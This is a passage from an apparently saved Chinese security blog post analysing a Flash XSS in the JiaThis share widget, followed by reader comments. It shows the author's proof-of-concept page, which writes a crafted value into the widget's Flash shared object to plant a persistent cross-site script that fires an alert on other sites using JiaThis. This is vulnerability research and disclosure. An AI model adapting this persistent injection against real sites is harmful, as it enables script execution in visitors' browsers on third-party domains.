+    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>lookup<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">body</span> <span class="na">onload</span><span class="o">=</span><span class="s">"return rootkit();"</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>
+hehe
+<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+<span class="c">&lt;!-- JiaThis Button BEGIN --&gt;</span>
+<span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">"jiathis_style"</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">a</span> <span class="na">class</span><span class="o">=</span><span class="s">"jiathis_button_qzone"</span><span class="p">&gt;&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">a</span> <span class="na">class</span><span class="o">=</span><span class="s">"jiathis_button_tsina"</span><span class="p">&gt;&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">a</span> <span class="na">class</span><span class="o">=</span><span class="s">"jiathis_button_tqq"</span><span class="p">&gt;&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">a</span> <span class="na">class</span><span class="o">=</span><span class="s">"jiathis_button_weixin"</span><span class="p">&gt;&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">a</span> <span class="na">class</span><span class="o">=</span><span class="s">"jiathis_button_renren"</span><span class="p">&gt;&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">"http://www.jiathis.com/share"</span> <span class="na">class</span><span class="o">=</span><span class="s">"jiathis jiathis_txt jtico jtico_jiathis"</span> <span class="na">target</span><span class="o">=</span><span class="s">"_blank"</span><span class="p">&gt;&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">a</span> <span class="na">class</span><span class="o">=</span><span class="s">"jiathis_counter_style"</span><span class="p">&gt;&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">"text/javascript"</span> <span class="na">src</span><span class="o">=</span><span class="s">"http://v3.jiathis.com/code/jia.js?uid=1427098094896152"</span> <span class="na">charset</span><span class="o">=</span><span class="s">"utf-8"</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="c">&lt;!-- JiaThis Button END --&gt;</span>
+<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="kd">function</span> <span class="nx">rootkit</span><span class="p">(){</span>
+    <span class="kd">var</span> <span class="nx">a</span> <span class="o">=</span> <span class="nb">document</span><span class="p">[</span><span class="s2">"JIATHISSWF"</span><span class="p">];</span>
+    <span class="nx">a</span><span class="p">.</span><span class="nx">writeSharedObject</span><span class="p">(</span><span class="s2">"jid"</span><span class="p">,</span> <span class="s1">'\\";(function(){if(location.host!=\'mhz.pw\'){alert(document.domain);}})();//a'</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</pre></div>
+<p>我将之保存在 <a href="http://mhz.pw/game/jiathis/jiathis.html"><a href="http://mhz.pw/game/jiathis/jiathis.html">http://mhz.pw/game/jiathis/jiathis.html</a></a>，当访问了这个页面以后，再访问使用了jiathis的网站，即可在该站域下触发XSS，形成一个永久的XSS Rootkit：</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201503/d6b91427290591.png"><img alt="QQ20150325-9@2x.png" src="./对JiaThis Flash XSS的挖掘与分析  离别歌/thum-d6b91427290591.png"/></a></p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201503/77c31427290597.png"><img alt="QQ20150325-10@2x.png" src="./对JiaThis Flash XSS的挖掘与分析  离别歌/thum-77c31427290597.png"/></a></p>
+</div>
+</article>
+<div id="reply-list">
+<h1>评论</h1>
+<div class="row" id="comment-2013">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./对JiaThis Flash XSS的挖掘与分析  离别歌/3a56ce0535842608fb1745260c5db5e6.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://www.aiyw.net" target="_blank">北京SEO</a>
+<time datetime="2015年4月6日 18:01" itemprop="datePublished">
+                            2015 四月 06 18:01
+                        </time>
+<a href="javascript:reply_to('2013', '北京SEO')">回复</a>
+</p>
+<p class="comment-meta">感谢你的分享</p>
+</div>
+</div>
+<div class="row" id="comment-1989">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./对JiaThis Flash XSS的挖掘与分析  离别歌/d41d8cd98f00b204e9800998ecf8427e.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">tm4n</a>
+<time datetime="2015年3月26日 13:55" itemprop="datePublished">
+                            2015 三月 26 13:55
+                        </time>
+<a href="javascript:reply_to('1989', 'tm4n')">回复</a>
+</p>
+<p class="comment-meta">复现不了了，官方已经修复了？</p>
+</div>
+</div>
+<div class="child-node">
+<div class="row" id="comment-1994">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./对JiaThis Flash XSS的挖掘与分析  离别歌/c4267eb6d17276fa31c547ac71611e90.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://www.leavesongs.com/" target="_blank">phithon</a>
+<time datetime="2015年3月26日 17:24" itemprop="datePublished">
+                            2015 三月 26 17:24
+                        </time>
+<a href="javascript:reply_to('1994', 'phithon')">回复</a>
+</p>
+<p class="comment-meta">@tm4n：不算修复，只算规避。把加载m.swf的代码删了。</p>
+</div>
+</div>
+</div>
+</div>
+<form action="#reply" enctype="multipart/form-data" id="reply" method="post">
+<textarea cols="40" id="id_content" name="content" required="" rows="6">
+</textarea>
+<div class="row">
+<div class="col-xs-4">
+<input id="id_nickname" maxlength="64" name="nickname" placeholder="昵称" required="" type="text"/>
+</div>
+<div class="col-xs-4">
+<input id="id_email" maxlength="254" name="email" placeholder="邮箱（可留空）" type="text"/>
+</div>
+<div class="col-xs-4">
+<input id="id_url" maxlength="200" name="url" placeholder="链接（可留空）" type="text"/>
+</div>
+</div>
+<div class="row" style="margin-top: 8px"><div class="col-xs-4"><input autocomplete="off" id="id_captcha_1" name="captcha_1" placeholder="验证码" type="text"/> <input id="id_captcha_0" name="captcha_0" type="hidden" value="2680b6ce8f4671020503e8bb87702091d25e54f9"/>
+</div><div class="col-xs-4">
+<img alt="captcha" class="captcha" height="25" src="./对JiaThis Flash XSS的挖掘与分析  离别歌/2680b6ce8f4671020503e8bb87702091d25e54f9"/></div></div>
+<div class="clearfix"></div>
+<input class="ui-button ui-button-sgreen" type="submit" value="提交"/>
+<input id="id_archive" name="archive" type="hidden" value="351">
+<input id="id_parent" name="parent" type="hidden"/>
+<input name="csrfmiddlewaretoken" type="hidden" value="uFijZ0yBlYVXe0XT9iHyFsdyTSPpzISU2ZDPNuKQMLPmeFl8Xzbie6fD2WixicH4"/>
+</input></form>
+</div>
+<footer id="footer">
+<div class="footer-left">
+    Copyright © 2017 Powered by talkbook
+  </div>
+<div class="footer-right">
+<nav>
+<ul>
+<li><a href="/">首页</a></li>
+<li><a href="http://weibo.com/101yx" target="_blank">微博</a></li>
+<li><a href="https://github.com/phith0n" target="_blank">项目</a></li>
+<li><a href="/template/change/">更换模板</a></li>
+</ul>
+</nav>
+</div>
+</footer>
+<script src="./对JiaThis Flash XSS的挖掘与分析  离别歌/main.js"></script>
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?ad9ab5e37c2811b9f0979e46123fc898";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+<script src="./对JiaThis Flash XSS的挖掘与分析  离别歌/jquery.fancybox.pack.js"></script>
+<script>
+$(document).ready(function () {
+    $("article a").each(function (i, e) {
+        if(e.host != 'www.leavesongs.com') {
+            e.target = '_blank';
+        }
+    });
+    $("article img").each(function (i, e) {
+        if(e.parentNode.tagName.toUpperCase() != 'A') {
+            $(e).wrap('<a href="'+escapeHtml(e.src)+'" class="fancybox"></a>');
+        } else {
+            $(e.parentNode).addClass('fancybox');
+        }
+    });
+    $('.fancybox').fancybox();
+})
+</script>
+</body>
+</html>
